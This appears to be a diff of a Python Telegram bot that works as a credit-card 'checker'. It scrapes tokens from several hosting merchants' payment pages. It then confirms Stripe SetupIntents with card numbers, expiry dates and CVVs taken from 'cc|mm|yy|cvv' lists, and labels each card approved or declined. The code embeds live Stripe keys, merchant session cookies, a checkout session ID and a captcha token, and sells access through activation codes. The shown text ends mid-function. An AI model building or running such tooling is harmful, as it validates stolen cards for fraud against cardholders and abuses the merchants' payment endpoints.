@@ -1,112 +1,39 @@
-Enter#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-
-import re
-import time
 import requests
+import telebot
+import time
 import uuid
+import json
+import re
 import threading
 import hashlib
 import random
 from datetime import datetime, timedelta
-from telebot import TeleBot, types
+from telebot import types
 
-# =============== توكن بوت التفاعل ===============
+# =============== CONFIG ===============
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 ADMIN_ID = 8855682617
 DEV = "@z_0_y2"
 VERSION = "⤷ ᴠ𝟼.𝟶"
 AUTHOR = "⤷ @z_0_y2"
+
+# =============== البوابات ===============
+GATEWAY_AUTH = "𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵"
+GATEWAY_3D = "𝗦𝘁𝗿𝗶𝗽𝗲 $𝟯"
+
 # =============== نظام المستخدمين والكودات ===============
-AUTHORIZED_USERS = [8855682617]
-user_codes = {}
-pending_codes = {}
+AUTHORIZED_USERS = [1970257616]  # الأدمن فقط في البداية
+user_codes = {}  # {user_id: {'expiry': timestamp}}
+pending_codes = {}  # {code: {'expiry': timestamp, 'created_by': admin_id}}
 
-# =============== البوابات الأربعة ===============
-GATEWAYS = [
-    {
-        "name": "Stripe Auth #1",
-        "stripe_key": "pk_live_51Ps3vERuauo2vgoqgy8ao06fnaQeTZ4yQhwXSMKOWXi4Mt30MX7ngj2nGM4IefvYP66TEgcm6A97yUXMDIRpBxN4009kt1eFst",
-        "url": "https://my.reliabecloud.com",
-        "cookies": {
-            '__stripe_mid': '5606e7f7-ffad-4a87-afff-7c4bbefa1288e4fcb4',
-            '__stripe_sid': '9be0b0e8-66a2-47fb-b1b9-e15b002bed59cc8101',
-            'WHMCSPKhB4ecIIbla': '7e05fba0b7e930c906ce8cdb6eb060da',
-        },
-        "token": None,
-        "client_session_id": None,
-        "wallet_config_id": None,
-        "setup_data": None,
-        "active": True,
-        "fail_count": 0,
-        "last_error": None,
-        "last_check": None
-    },
-    {
-        "name": "Stripe Auth #2",
-        "stripe_key": "pk_live_51PElYwIFXufYIZycRp4YJLtrPXgfPDQ3CIhexgD9ZshcwFFb37t0j5eiTHucHF9MK5x6R98OB33A9if2uVgazNLO00m6NHeph5",
-        "url": "https://www.fastpanda.co.uk",
-        "cookies": {
-            '_currency': 'GBP',
-            '__stripe_mid': 'c80e6842-8e7f-4094-bf69-b0bfad479dc3371465',
-            '__stripe_sid': 'c48426b9-1b57-471a-99ea-41b61b1faf0634009f',
-            'WHMCSy551iLvnhYt7': 'jfdibhghp5lknhqvg1matrrhd7',
-            'WHMCSUser': '6125%3A%3A7da785e673fb9cd6a96ee730b1d3e9fc5ee1a853',
-        },
-        "token": None,
-        "client_session_id": None,
-        "wallet_config_id": None,
-        "setup_data": None,
-        "active": True,
-        "fail_count": 0,
-        "last_error": None,
-        "last_check": None
-    },
-    {
-        "name": "Stripe Auth #3",
-        "stripe_key": "pk_live_51NxTgeFZsEVAL3ZKnbjGrz8S0xO6fhPvT4bt4aeooxVpo5Scvr9sBQQ24ROaDcQGBavclQgqnrNPJOuqY4rlW5ji000xb2zNt3",
-        "url": "https://dashboard.proxywing.com",
-        "cookies": {
-            '__stripe_mid': '00c7238d-a235-4f5a-81a2-88c5ee79ddb7abcb25',
-            '__stripe_sid': '8380ecbd-126c-4f1f-a242-879f55bd453c5eead6',
-            'WHMCSfJ1XkWUErbVN': '9ur34qe7208kf4q92esim7dvk5',
-        },
-        "token": None,
-        "client_session_id": None,
-        "wallet_config_id": None,
-        "setup_data": None,
-        "active": True,
-        "fail_count": 0,
-        "last_error": None,
-        "last_check": None
-    },
-    {
-        "name": "Stripe Auth #4",
-        "stripe_key": "pk_live_CyAsnsy8MCNVuWWHRCOmtmSb",
-        "url": "https://www.bacloud.com",
-        "cookies": {
-            '__stripe_mid': '2150425d-64a2-4a0b-88d5-2878c850bd4e3336ea',
-            '__stripe_sid': '6a0b2496-4c3c-4aa4-8a14-b6bbaa31790ea0cf3c',
-            'WHMCS6gnIyj0tBZJA': 'or7eg2ni1n5mrdlrjpabqo31ol',
-        },
-        "token": None,
-        "client_session_id": None,
-        "wallet_config_id": None,
-        "setup_data": None,
-        "active": True,
-        "fail_count": 0,
-        "last_error": None,
-        "last_check": None
-    }
-]
-
-bot = TeleBot(BOT_TOKEN, parse_mode='HTML')
-selected_gateway_index = 0
-temp_files = {}
+# =============== إعدادات البوت ===============
+bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
+stop_flags = {}
 
 # =============== دوال نظام الكودات ===============
 def is_authorized(user_id):
-    if user_id in ADMINS:
+    """التحقق من صلاحية المستخدم (أدمن أو مستخدم لديه كود مفعل)"""
+    if user_id in AUTHORIZED_USERS:
         return True
     if user_id in user_codes:
         if user_codes[user_id]['expiry'] > time.time():
@@ -116,251 +43,35 @@ def is_authorized(user_id):
     return False
 
 def generate_user_code(expiry_days):
+    """إنشاء كود جديد للمستخدمين"""
     code = hashlib.md5(f"{time.time()}{random.random()}".encode()).hexdigest()[:12]
     pending_codes[code] = {
         'expiry': time.time() + (expiry_days * 86400),
-        'created_by': ADMINS[0]
+        'created_by': ADMIN_ID
     }
     return code
 
 def activate_user_code(user_id, code):
+    """تفعيل كود للمستخدم"""
     if code in pending_codes:
         data = pending_codes[code]
-        user_codes[user_id] = {'expiry': data['expiry']}
+        user_codes[user_id] = {
+            'expiry': data['expiry']
+        }
         del pending_codes[code]
         return True
     return False
 
 def get_user_expiry(user_id):
+    """الحصول على تاريخ انتهاء صلاحية المستخدم"""
     if user_id in user_codes:
         expiry = user_codes[user_id]['expiry']
         return datetime.fromtimestamp(expiry).strftime('%Y-%m-%d %H:%M:%S')
-    return "Not registered"
+    return "غير مسجل"
 
-# =============== دوال تحديث البوابة (مثل سورس القناة) ===============
-def update_gateway(gateway):
-    """تحديث البوابة والحصول على SetupIntent جديد"""
-    try:
-        print(f"   🔄 Updating {gateway['name']}...")
-        
-        headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9', 
-                   'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'}
-        
-        if "reliabecloud" in gateway['url']:
-            url = f"{gateway['url']}/index.php?rp=/account/paymentmethods/add"
-        elif "fastpanda" in gateway['url']:
-            url = f"{gateway['url']}/index.php/account/paymentmethods/add"
-        elif "proxywing" in gateway['url']:
-            url = f"{gateway['url']}/billing/account/paymentmethods/add"
-        else:
-            url = f"{gateway['url']}/index.php?rp=/account/paymentmethods/add"
-        
-        response = requests.get(url, headers=headers, cookies=gateway["cookies"], timeout=15)
-        if response.status_code != 200:
-            gateway["active"] = False
-            gateway["fail_count"] += 1
-            gateway["last_error"] = f"HTTP {response.status_code}"
-            gateway["last_check"] = datetime.now().strftime('%H:%M:%S')
-            return False
-        
-        html = response.text
-        
-        token_match = re.search(r'name="token"\s+value="([a-f0-9]+)"', html)
-        if not token_match:
-            token_match = re.search(r'"token":"([a-f0-9]+)"', html)
-        gateway["token"] = token_match.group(1) if token_match else None
-        
-        if not gateway["token"]:
-            gateway["active"] = False
-            gateway["fail_count"] += 1
-            gateway["last_error"] = "Token not found"
-            gateway["last_check"] = datetime.now().strftime('%H:%M:%S')
-            return False
-        
-        cs_match = re.search(r'client_session_id["\']?\s*[:=]\s*["\']([a-f0-9-]+)["\']', html)
-        gateway["client_session_id"] = cs_match.group(1) if cs_match else str(uuid.uuid4())
-        
-        wc_match = re.search(r'wallet_config_id["\']?\s*[:=]\s*["\']([a-f0-9-]+)["\']', html)
-        gateway["wallet_config_id"] = wc_match.group(1) if wc_match else str(uuid.uuid4())
-        
-        headers2 = {
-            'accept': 'application/json, text/javascript, */*; q=0.01',
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': gateway['url'],
-            'referer': url,
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
-            'x-requested-with': 'XMLHttpRequest',
-        }
-        
-        data = f'token={gateway["token"]}&type=token_stripe&description=&cardcvv=&bankaccttype=Checking&billingcontact=0'
-        
-        if "reliabecloud" in gateway['url']:
-            url2 = f"{gateway['url']}/index.php?rp=/stripe/setup/intent"
-        elif "fastpanda" in gateway['url']:
-            url2 = f"{gateway['url']}/index.php?rp=/stripe/setup/intent"
-        elif "proxywing" in gateway['url']:
-            url2 = f"{gateway['url']}/billing/index.php?rp=/stripe/setup/intent"
-        else:
-            url2 = f"{gateway['url']}/index.php?rp=/stripe/setup/intent"
-        
-        response2 = requests.post(url2, headers=headers2, data=data, cookies=gateway["cookies"], timeout=15)
-        result = response2.json()
-        
-        if 'setup_intent' in result:
-            full = result['setup_intent']
-            gateway["setup_data"] = {
-                'id': full.split('_secret')[0],
-                'secret': full
-            }
-            gateway["active"] = True
-            gateway["fail_count"] = 0
-            gateway["last_error"] = None
-            gateway["last_check"] = datetime.now().strftime('%H:%M:%S')
-            print(f"   ✅ {gateway['name']} Updated")
-            return True
-        else:
-            gateway["active"] = False
-            gateway["fail_count"] += 1
-            gateway["last_error"] = result.get('error', {}).get('message', 'SetupIntent failed')
-            gateway["last_check"] = datetime.now().strftime('%H:%M:%S')
-            return False
-            
-    except Exception as e:
-        print(f"   ❌ Failed {gateway['name']}: {e}")
-        gateway["active"] = False
-        gateway["fail_count"] += 1
-        gateway["last_error"] = str(e)[:100]
-        gateway["last_check"] = datetime.now().strftime('%H:%M:%S')
-        return False
-
-def create_fresh_setup_intent(gateway):
-    """إنشاء SetupIntent جديد (مثل update_gateway ولكن يعيد البيانات)"""
-    try:
-        headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9', 
-                   'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'}
-        
-        if "reliabecloud" in gateway['url']:
-            url = f"{gateway['url']}/index.php?rp=/account/paymentmethods/add"
-        elif "fastpanda" in gateway['url']:
-            url = f"{gateway['url']}/index.php/account/paymentmethods/add"
-        elif "proxywing" in gateway['url']:
-            url = f"{gateway['url']}/billing/account/paymentmethods/add"
-        else:
-            url = f"{gateway['url']}/index.php?rp=/account/paymentmethods/add"
-        
-        response = requests.get(url, headers=headers, cookies=gateway["cookies"], timeout=15)
-        if response.status_code != 200:
-            return None
-        
-        html = response.text
-        
-        token_match = re.search(r'name="token"\s+value="([a-f0-9]+)"', html)
-        token = token_match.group(1) if token_match else None
-        if not token:
-            return None
-        
-        cs_match = re.search(r'client_session_id["\']?\s*[:=]\s*["\']([a-f0-9-]+)["\']', html)
-        client_session_id = cs_match.group(1) if cs_match else str(uuid.uuid4())
-        
-        wc_match = re.search(r'wallet_config_id["\']?\s*[:=]\s*["\']([a-f0-9-]+)["\']', html)
-        wallet_config_id = wc_match.group(1) if wc_match else str(uuid.uuid4())
-        
-        stripe_mid = None
-        stripe_sid = None
-        for cookie in requests.Session().get(url, headers=headers).cookies:
-            if cookie.name == '__stripe_mid':
-                stripe_mid = cookie.value
-            if cookie.name == '__stripe_sid':
-                stripe_sid = cookie.value
-        
-        headers2 = {
-            'accept': 'application/json',
-            'content-type': 'application/x-www-form-urlencoded',
-            'x-requested-with': 'XMLHttpRequest',
-        }
-        
-        data = f'token={token}&type=token_stripe&billingcontact=0'
-        
-        if "reliabecloud" in gateway['url']:
-            url2 = f"{gateway['url']}/index.php?rp=/stripe/setup/intent"
-        elif "fastpanda" in gateway['url']:
-            url2 = f"{gateway['url']}/index.php?rp=/stripe/setup/intent"
-        elif "proxywing" in gateway['url']:
-            url2 = f"{gateway['url']}/billing/index.php?rp=/stripe/setup/intent"
-        else:
-            url2 = f"{gateway['url']}/index.php?rp=/stripe/setup/intent"
-        
-        response2 = requests.post(url2, headers=headers2, data=data, cookies=gateway["cookies"], timeout=15)
-        result = response2.json()
-        
-        if 'setup_intent' in result:
-            full = result['setup_intent']
-            return {
-                'id': full.split('_secret')[0],
-                'secret': full,
-                'client_session_id': client_session_id,
-                'wallet_config_id': wallet_config_id,
-                'stripe_mid': stripe_mid or str(uuid.uuid4()),
-                'stripe_sid': stripe_sid or str(uuid.uuid4()),
-            }
-        return None
-    except Exception as e:
-        print(f"   ❌ Failed to create intent: {e}")
-        return None
-
-def update_all_gateways():
-    print("\n🔄 Updating all gateways...")
-    for gateway in GATEWAYS:
-        update_gateway(gateway)
-        time.sleep(0.3)
-    print("✅ All gateways updated")
-
-# =============== فحص البطاقة (مع إنشاء SetupIntent جديد لكل بطاقة) ===============
-def check_card_with_gateway(card_line, gateway):
-    # إنشاء SetupIntent جديد لكل بطاقة (مثل سورس القناة)
-    intent_data = create_fresh_setup_intent(gateway)
-    
-    if not intent_data:
-        return "❌ FAILED TO CREATE INTENT"
-    
-    try:
-        parts = card_line.split('|')
-        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
-        if len(yy) == 4:
-            yy = yy[-2:]
-        
-        formatted_cc = ' '.join([cc[i:i+4] for i in range(0, len(cc), 4)])
-        
-        headers = {
-            'authority': 'api.stripe.com',
-            'accept': 'application/json',
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://js.stripe.com',
-            'referer': 'https://js.stripe.com/',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
-        }
-        
-        data = f'payment_method_data[type]=card&payment_method_data[card][number]={formatted_cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={mm.zfill(2)}&payment_method_data[card][exp_year]={yy}&payment_method_data[guid]=9cf5bb6e-4c21-4b0b-8201-f1038da56c735b2538&payment_method_data[muid]={intent_data["stripe_mid"]}&payment_method_data[sid]={intent_data["stripe_sid"]}&payment_method_data[payment_user_agent]=stripe.js%2F58c31ec645%3B+stripe-js-v3%2F58c31ec645%3B+split-card-element&payment_method_data[referrer]={gateway["url"]}&payment_method_data[time_on_page]=50000&payment_method_data[client_attribution_metadata][client_session_id]={intent_data["client_session_id"]}&payment_method_data[client_attribution_metadata][merchant_integration_source]=elements&payment_method_data[client_attribution_metadata][merchant_integration_subtype]=split-card-element&payment_method_data[client_attribution_metadata][merchant_integration_version]=2017&payment_method_data[client_attribution_metadata][wallet_config_id]={intent_data["wallet_config_id"]}&expected_payment_method_type=card&use_stripe_sdk=true&key={gateway["stripe_key"]}&client_attribution_metadata[client_session_id]={intent_data["client_session_id"]}&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=split-card-element&client_attribution_metadata[merchant_integration_version]=2017&client_attribution_metadata[wallet_config_id]={intent_data["wallet_config_id"]}&client_secret={intent_data["secret"]}'
-        
-        url = f'https://api.stripe.com/v1/setup_intents/{intent_data["id"]}/confirm'
-        response = requests.post(url, headers=headers, data=data, timeout=8)
-        result = response.json()
-        
-        if result.get('status') == 'succeeded':
-            return "✅ APPROVED"
-        elif 'error' in result:
-            decline_code = result['error'].get('decline_code', '')
-            decline_message = result['error'].get('message', '')
-            if decline_code:
-                return f"❌ DECLINED [{decline_code}]"
-            elif decline_message:
-                short_msg = decline_message[:40] + "..." if len(decline_message) > 40 else decline_message
-                return f"❌ DECLINED [{short_msg}]"
-            return "❌ DECLINED"
-        return "❌ DECLINED"
-        
-    except Exception as e:
-        return f"❌ ERROR [{str(e)[:20]}]"
+# =============== دوال مساعدة ===============
+def mask_cc(cc):
+    return f"{cc[:4]}******{cc[-4:]}"
 
 def get_bin_info(bin_num):
     try:
@@ -378,71 +89,228 @@ def get_bin_info(bin_num):
         pass
     return {'bank': 'Unknown', 'country': 'Unknown', 'emoji': '🌍', 'scheme': 'Unknown', 'type': 'Unknown'}
 
-def extract_cards_from_text(content):
-    cards = []
-    for line in content.split('\n'):
-        line = line.strip()
-        if line and '|' in line:
-            parts = line.split('|')
-            if len(parts) >= 4:
-                cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
-                if len(yy) == 4:
-                    yy = yy[-2:]
-                cards.append(f"{cc}|{mm}|{yy}|{cvv}")
-    return cards
+# =============== 1. بوابة Stripe Auth ===============
+STRIPE_AUTH_KEY = "pk_live_51NxTgeFZsEVAL3ZKnbjGrz8S0xO6fhPvT4bt4aeooxVpo5Scvr9sBQQ24ROaDcQGBavclQgqnrNPJOuqY4rlW5ji000xb2zNt3"
+
+def create_setup_intent_auth():
+    session = requests.Session()
+    headers = {
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
+    }
+    try:
+        response = session.get('https://dashboard.proxywing.com/billing/account/paymentmethods/add', headers=headers, timeout=30)
+        if response.status_code != 200:
+            return None
+        
+        html = response.text
+        token_match = re.search(r'name="token"\s+value="([a-f0-9]+)"', html)
+        token = token_match.group(1) if token_match else None
+        if not token:
+            return None
+        
+        session_match = re.search(r'client_session_id["\']?\s*[:=]\s*["\']([a-f0-9-]+)["\']', html)
+        client_session_id = session_match.group(1) if session_match else str(uuid.uuid4())
+        
+        wallet_match = re.search(r'wallet_config_id["\']?\s*[:=]\s*["\']([a-f0-9-]+)["\']', html)
+        wallet_config_id = wallet_match.group(1) if wallet_match else "2c10bacc-6fe0-42ea-a155-111bdb9d9751"
+        
+        stripe_mid = None
+        stripe_sid = None
+        for cookie in session.cookies:
+            if cookie.name == '__stripe_mid':
+                stripe_mid = cookie.value
+            if cookie.name == '__stripe_sid':
+                stripe_sid = cookie.value
+        
+        headers2 = {
+            'accept': 'application/json, text/javascript, */*; q=0.01',
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'origin': 'https://dashboard.proxywing.com',
+            'referer': 'https://dashboard.proxywing.com/billing/account/paymentmethods/add',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
+            'x-requested-with': 'XMLHttpRequest',
+        }
+        
+        data = {
+            'token': token,
+            'type': 'token_stripe',
+            'description': '',
+            'ccstart': '',
+            'ccissuenum': '',
+            'cardcvv': '',
+            'bankaccttype': 'Checking',
+            'bankacctholdername': '',
+            'bankname': '',
+            'bankroutingnum': '',
+            'bankacctnum': '',
+            'billingcontact': '0',
+            'billing_name': '',
+            'billing_address_1': '',
+            'billing_address_2': '',
+            'billing_city': '',
+            'billing_state': '',
+            'billing_postcode': '',
+            'billing_country': ''
+        }
+        
+        response2 = session.post('https://dashboard.proxywing.com/billing/index.php?rp=/stripe/setup/intent', 
+                                  headers=headers2, 
+                                  data=data,
+                                  timeout=30)
+        
+        if response2.status_code == 200:
+            result = response2.json()
+            setup_intent_full = result.get('setup_intent')
+            
+            if setup_intent_full and '_secret_' in setup_intent_full:
+                return {
+                    'setup_intent_id': setup_intent_full.split('_secret')[0],
+                    'client_secret': setup_intent_full,
+                    'client_session_id': client_session_id,
+                    'wallet_config_id': wallet_config_id,
+                    'stripe_mid': stripe_mid or str(uuid.uuid4()),
+                    'stripe_sid': stripe_sid or str(uuid.uuid4()),
+                }
+        return None
+    except:
+        return None
+
+def check_card_auth(card_line):
+    try:
+        parts = card_line.split('|')
+        if len(parts) < 4:
+            return "INVALID"
+        
+        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
+        
+        intent_data = create_setup_intent_auth()
+        if not intent_data:
+            return "ERROR"
+        
+        formatted_cc = ' '.join([cc[i:i+4] for i in range(0, len(cc), 4)])
+        
+        data = f'payment_method_data[type]=card&payment_method_data[card][number]={formatted_cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={mm.zfill(2)}&payment_method_data[card][exp_year]={yy}&payment_method_data[guid]=9cf5bb6e-4c21-4b0b-8201-f1038da56c735b2538&payment_method_data[muid]={intent_data["stripe_mid"]}&payment_method_data[sid]={intent_data["stripe_sid"]}&payment_method_data[payment_user_agent]=stripe.js%2Ff93cb2e34f%3B+stripe-js-v3%2Ff93cb2e34f%3B+split-card-element&payment_method_data[referrer]=https%3A%2F%2Fdashboard.proxywing.com&payment_method_data[time_on_page]=34917&payment_method_data[client_attribution_metadata][client_session_id]={intent_data["client_session_id"]}&payment_method_data[client_attribution_metadata][merchant_integration_source]=elements&payment_method_data[client_attribution_metadata][merchant_integration_subtype]=split-card-element&payment_method_data[client_attribution_metadata][merchant_integration_version]=2017&payment_method_data[client_attribution_metadata][wallet_config_id]={intent_data["wallet_config_id"]}&expected_payment_method_type=card&use_stripe_sdk=true&key={STRIPE_AUTH_KEY}&client_attribution_metadata[client_session_id]={intent_data["client_session_id"]}&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=split-card-element&client_attribution_metadata[merchant_integration_version]=2017&client_attribution_metadata[wallet_config_id]={intent_data["wallet_config_id"]}&client_secret={intent_data["client_secret"]}'
+        
+        headers = {
+            'accept': 'application/json',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://js.stripe.com',
+            'referer': 'https://js.stripe.com/',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
+        }
+        
+        url = f"https://api.stripe.com/v1/setup_intents/{intent_data['setup_intent_id']}/confirm"
+        response = requests.post(url, headers=headers, data=data, timeout=30)
+        result = response.json()
+        
+        threading.Thread(target=create_setup_intent_auth, daemon=True).start()
+        
+        if response.status_code == 200 and result.get('status') == 'succeeded':
+            return "APPROVED"
+        else:
+            return "DECLINED"
+            
+    except Exception as e:
+        return "ERROR"
+
+# =============== 2. بوابة Stripe $3 ===============
+STRIPE_3D_KEY = "pk_live_51GjnvOEtynl19Eg2AOFRLLS54B2hzHZvHVgadRoeO1hZsMbvhZ54lzfRQsLVzXB7rvCeB1l7plSXA3mVqQJa1L1P008HUtbtyF"
+CLIENT_SESSION_ID = "984353da-f765-4331-925e-640edb2caa11"
+CHECKOUT_SESSION_ID = "cs_live_a1eI6jVt4AWmA84VofiO8deHZXFDRWOmUuVt6m22Z96nFd2sNpjsMcLYBF"
+CHECKOUT_CONFIG_ID = "873ff754-640d-4ba1-8f89-0659fe6abdfc"
+GUID = "9cf5bb6e-4c21-4b0b-8201-f1038da56c735b2538"
+MUID = "b019ca67-8b30-40a0-907f-4a738930c6fcb03933"
+SID = "9a7adf4e-f312-41e9-9461-51c6506cd9c1cef65c"
+PASSIVE_CAPTCHA_TOKEN = "P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzc2MjU4NDA2LCJjZGF0YSI6InM0SFZRVm5YRDRzcFUzYzgvWnVBSlRJaHkxREdweUtIaXNmTzRhZk9KYWhRUUZDUm5YdmZvdmdGQTVZQlQwell1SERjMmdvTjF6SEtweW9tMkRMZGZINnJLYmU5V2dZL0V3Zm1RM2E3am1UTDNMVENNaFRXdngxckZUSGFOZ2QwWnZkZVJ5aXQ0dTIyYjVUUklsSVU1eVdVdG5WTVdScE10NDhCNzUwWkc4WVAwd2VkK3hqRTJRUjhXbzgxenN2SnBrUk9xTG1mMzhEQk5IazNyc1MwNVFud2pqTXFOUUJzaW83bnk5YUhRcXExRFhPMmdtR0RKLzhQZE9FaFRoMCtuMTE0TXpDc3IvaC9sUkNhU1pjYmxCVkFhOEhsMVdOM1doT0h2VmhvZFVXM1ZkaGo5VXNCZXRzcGdKc2N4UjR6d1ZHZDR6a242V0Y3WE1WZmFhZGppOElwRzM3a1ZablNpTktFb2NuekNPdUVkbzhzNVJ0Z3hxeDZJckZzQWowQUh2RC82anMrZm9VY3BHeXN0eno5dDk3WWVGMzBpWXNMZFQxM0FIQkhGajk5NEd4UmZoREU4ZDZ3Zld4akdXeXFzcHJGZVFJNWJpRmwiLCJwYXNza2V5IjoiV3NWdG1uZWdmaWp5MnBvZTIvNitERTJIZklrZmxHeWE1RHRxcUVTR3IrUmVYRlFBeGlDSjNTampRaUU5YlNKS0lBV01xS3I0bVRIQkFMazJiOUJkeU5oMzRTdkg5bE1WL3dPakpQUXE2SU91ZTVkK1BCWlVLdkFMS3pRajd3blA2WFovaFlBTXdsdUkvOFNXRzVhREpmZU44d3ZRZWRHOUhVME1EZVQ4K3RKSGZONEpvQkE0ZG16WFl4dE9VQ04rNnQ5NVNURUdldUhqcnEvMGMzbjBLMU4xRXkzaUkrY2hvQ2tkM2tUYXR3YTRUVE1GaDRJWUx0UXNQOWRTSVpnem82MGJGTkdxc29ialUvUEVqQVBycmE0bXcyQkJqam95SUxzejA0VVVJdTBWajdLKzUxS0xRbnJqOTJ6YjBza2M1dDk5bDRoOE9YOWJFSldiRlNiOHI4K2hIdEhQTFhDUldQenlsdzJud1picFY2OFZYQThUakpxK2lIZGJMRDJyeENLcWlNcnBvdnlPSU8vMjZ5V1ZpcGRENFlvdTZoUVkzZVR4ZlMwSkhEa3YySG5maUdxZVRRTjQxczZ1QWljdWZybTJDRE1ZYkRNNC9oSUtISGEyOW1XTDlZdUlQZUo3aTk1cTBTZHpMbVFuTCt2bE44VWFidjluMUdwdFJ6K1FqMUFEb3drdEZIR2F5eFp5a0tjbWovc0Q0YmZrSDUxcEQ2NVUzU2lEdDByelhiVHVRRGhWaDA4TEZXS05OcnNvMElOcUxWVFh1bXFUUEd0OUQ4SFFKV3M0SXptamJ1OU93dDZ1Z0NSWmpWU1BTcW9tTC9nMWh0VDZGQWVhQUJqRVZmejduaTBtSXhzNUJRVmVQanpDZ2pjdVpEaGxOSzlFdG5aSGlEZ0RrNnByc3Era1Ixb0lhM3pzNWJaN1R6UWc5dE80TXVNUFI4MlE1N1FOdEx0VkFQdjlILzBBc2VYN2Y5MTh3by9VTERCbFdnc3BuVW0wVjBWSmU1MVVjRXQ1R2xuTEF3bUxhSUt1TWdUK0FGVkhQNnpZWGNMOEh5SWYxVk16SEF1Z2dtYWU4VUFmVEFwSVozRDYvem9JQzVkeVF4SExLREE1aGk5dVo0MzEyMmdDMUNTeXcwcUVVcXV2TUZRV2Z1MFVoV1hYQUlZUUhPc0NyK1liUmJTYnRWdG11U0w1VFM2QnFCNmNKeWFmWnJIeE5ZNm5VemYyQk9BbVI5M2RLU24vY3RqeWpRREI1TGVUdmxqN1ZSY1N2MWtYekVYcGhrMVJlOHd6WTNHdnVjeWZWMDBlb3dxUFNsd2M5ZUdsZzJIRlcveGtyVlZUZ1hVQzRTdDh2MU9oeUVmL3daV1VTN1hTRlpHSUNzMHZHUVFzb2xMYXBTamtkckticnRnak1vdkh2TnNRZFgrbzQ2S1UrWFZBakY4TUZDVWhYODJ4ajRNUEk5NGx4K3RGWWlDRUNJeHZndTMvZ2pjdldYakVDUWtvL3NGaFVUS2d1bkNwQjM0UjhXYVNsME5XNDJaalVzMlZkRjMwQUVEeEpJRE5iZ2hXcTczRmZ3SlowYVZOL3ZEZjN3RjRkM2t4bDNaVWJESHRTQS83OHJyR0JINmt1YkNaZkpWNy9xWTBabmgxY3Axc0FYcWwzZTQwOUwzUFdtQ2ZiTXFhZU5hYUp0Q2pOS3JQdlRrQVh0Q2xuaFozaER5OElnQk5ra21xUWZYRjIxR083NURHK1U3TVYvZzlSR1crNERBRjIrNFdRb1E2Zk9ncnFVaEowRDREMCtxZE1xZU1obmU2YU5tdXJJdDJMYUsyVkU0RXBSSElhaGtIMHRVYlNaNjg5TlRqbGIzaUdzMW9SUGxwd2M1RWlpOFpLRkRpT2dhU0cxZ0tDN0lUblNEbStXN3VMS0VVUTgxOWZtM2hGcFJ5eVBvaTgxWkY3UW9EbE1yUnFJa3ZUZ0FvSit1RzJ3cjBSTFl4VWJEeVNkeG9oSzljY09hTVpQUUxqem9HQi9oVEVZY0srM1IrZVA4MENwTFJ6a2htbWxQdTAvVnJHTEhvaE9JYW5ha1Rqd21ZRlJQSXE4WWsyU25GNUpWVVVGdkRGSWJjS1RoVkhPbjNHUS9PUjRXSHlyM2xRaDNocEJDSzR6c3FXcSt5MDRjd3Q5UVkzMnllTDhFM0xXSUZFMmQ1WU82VmEySWo3WmZ6TzlSTjEycXRUY0NGUjZtbUYrYk5mT0U5dFhxT2tzbFpNbURnMmRVU0RDU3lBODBXc09PZkFHSGJHdkNRQ2N6MnRVSExnUndSQmdObjZZeHBraWl3dmplYlMrMDZVRk1QcVJ3ZE5zeWM5UlNCV1R4OWxVQlJ5WWlFeHV4bENRcDMyMmdBaTFmY3F1R2JET1JwWi9IV3VwSTFSc21BMUVDQVI0T2t6bXc0cldnNEFlMTJudXgzLzR3UU5uZlVMNS9mNUduTy81R2RWM2NyRmpLekd5Mjh4V0gzV1FFRnNwS2dJVWlQNHN3VFAxZU4wZTBaODJJSXFYeEwxMXRPQnYxdGtHTjNyQTFnd3BUMlpWeS9WeSswM2psYVZoSU5oTmVOaVo5N3RNcXMyRXBrUEZQNUNWRW1mcEFZeXJqVlN1TWtHaFJJU0RRRytnQlAyMGliQ2YyYmRHY1NHR0RrVjUwbys5b2lXL0NHcE1LMVRDTGY1dW9ua3UvSFMxa0Y2RXNTeU82QjhQTzVTSHNPQXg1dFNRRElrYU9vTURTQXIrUGo2WldyK21Bc0FueXZONWFsd3ArS2c5cEdGVEJPTTA5a0JGbzRldE80cDVheEp2RE90LzBOTDl0cHBXcXk0d0JxendjOWdycXU1V2c9Iiwia3IiOiIyZTQxYTVlNyIsInNoYXJkX2lkIjozMzk1MTAzMDN9.369qo7q2T5sq-7iY8TmaCs8Mrt_K_8zVn5VsrUISexk"
+
+def check_card_3d(card_line):
+    try:
+        parts = card_line.split('|')
+        if len(parts) < 4:
+            return "INVALID"
+        
+        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
+        
+        formatted_cc = ' '.join([cc[i:i+4] for i in range(0, len(cc), 4)])
+        
